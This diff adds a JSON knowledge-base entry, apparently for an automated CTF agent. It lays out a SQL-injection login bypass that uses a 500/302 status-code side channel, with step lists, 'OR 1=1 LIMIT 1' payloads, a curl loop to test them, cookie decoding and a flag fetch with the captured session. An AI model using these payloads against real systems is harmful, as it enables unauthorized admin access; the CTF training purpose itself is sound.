@@ -1,0 +1,78 @@
+{
+  "id": "auto-login-sqli-authbypass",
+  "title": "登录接口字符型 SQL 注入认证绕过（500/302 状态码旁信道）",
+  "vuln_pattern": "登录处理器先执行 SQL 查询后渲染模板，模板损坏使失败路径恒回 500、成功路径 redirect 回 302；用带 LIMIT 1 的 OR 注入令查询恰好返回一行即以首个用户（常为管理员）身份登录。",
+  "fingerprint": [
+    "登录",
+    "登录页",
+    "系统响应异常",
+    "输入特殊字符",
+    "资产管理",
+    "后台",
+    "报表",
+    "搜索",
+    "认证绕过",
+    "sql injection",
+    "sqli",
+    "auth bypass",
+    "login",
+    "500",
+    "302",
+    "OR 1=1 LIMIT 1"
+  ],
+  "exploit_steps": [
+    "指纹与路由枚举：确认技术栈（如 Flask/PHP），目录爆破找出受保护端点，尤其定位直接返回 flag 的管理端点（如 /admin/flag 之类 JSON 接口）。",
+    "观察状态码差异：若登录接口对任意输入恒定 500、而未认证访问受保护路由一律 302→登录页，则把 500 理解为“失败路径渲染损坏模板”，而非“注入不存在”。",
+    "对每个输入点（优先 username 参数，password 填任意值）逐一手测认证绕过 payload，先用最简形态验证注入可控性。",
+    "关键修饰：给注入加 LIMIT 1，使查询恰好返回一行——裸 OR 1=1 因返回多行会让后端异常 500，反而不可用。",
+    "以状态码为 oracle：出现 302 + Set-Cookie（Location 指向 /dashboard 之类）即认证绕过成功，停止其余注入尝试。",
+    "解码 session cookie（base64/JSON）确认身份字段（is_admin/user_id/username），确认已获得管理员身份。",
+    "带该 session 遍历受保护路由收割目标（flag 端点、报表导出、搜索 API 等），拿到 flag 即收手。"
+  ],
+  "key_payloads": [
+    "# 认证绕过 payload 集（打 username，password 任意），LIMIT 1 是命中关键：",
+    "' OR 1=1 LIMIT 1-- -",
+    "<user>' OR 1=1 LIMIT 1-- -",
+    "<user>' or 1=1 limit 1-- -   # 大小写/前缀变体都试",
+    "",
+    "# 判定循环骨架（curl，观察状态码/Location/Set-Cookie）：",
+    "for p in \"${payloads[@]}\"; do",
+    "  curl -s -i -X POST \"http://<host>/login\" \\",
+    "    --data-urlencode \"username=$p\" --data-urlencode \"password=x\" \\",
+    "    | grep -iE '^HTTP/|^location:|^set-cookie:'",
+    "done",
+    "",
+    "# 带缴获会话遍历受保护路由取 flag：",
+    "curl -s -i -b \"session=<captured_cookie>\" \"http://<host>/admin/flag\"",
+    "",
+    "# 解码 Flask 风格 session cookie（点分第一段 base64url）：",
+    "echo '<cookie_first_segment>' | base64 -d   # -> {\"is_admin\": true, \"user_id\": 1, ...}"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "sql-injection",
+    "auth-bypass",
+    "login-bypass",
+    "status-code-oracle",
+    "flask",
+    "session-cookie",
+    "web"
+  ],
+  "source": "writeup 提炼(通用方法)",
+  "source_tier": "seed",
+  "preconditions": [
+    "存在一个仅暴露登录页的中小型 Web 系统，登录接口直接把用户输入拼进 SQL 查询。",
+    "登录失败路径需渲染模板而模板损坏/缺失，导致失败恒 500、成功走 redirect 回 302，形成状态码旁信道。",
+    "服务器端会话为可解码的签名/编码 cookie（如 Flask itsdangerous 签名的 base64 JSON），身份字段可读。"
+  ],
+  "verify_oracle": "某个 LIMIT 1 注入 payload 使 POST /login 返回 302 + Set-Cookie（Location 指向登录后页面），解码 cookie 得到 is_admin=true 之类管理员身份字段；随后带该 cookie 访问管理端点返回 200 并含 flag。",
+  "pitfalls": [
+    "把登录接口恒定 500 误判为“注入不存在/服务不可用”，从而错过真正的注入点——500 只挡失败路径，302 才是成功信号。",
+    "忘记加 LIMIT 1：裸 OR 1=1 返回多行会触发后端异常 500，看起来像注入失败。",
+    "在会话 cookie 伪造/弱口令穷举等支线上过度消耗算力——SECRET_KEY 随机时伪造无解，口令爆破对模板损坏的登录也恒 500。",
+    "轻信官方提示指向的功能面（报表/搜索）就是注入点——这类页面需先认证，真实注入点常在登录处；提示中“输入特殊字符”的思路仍适用但落点不同。",
+    "别在公开、已做 intval/预处理的参数上耗时间，也别在未认证状态盲打需登录的功能。"
+  ],
+  "anti_fingerprint": []
+}
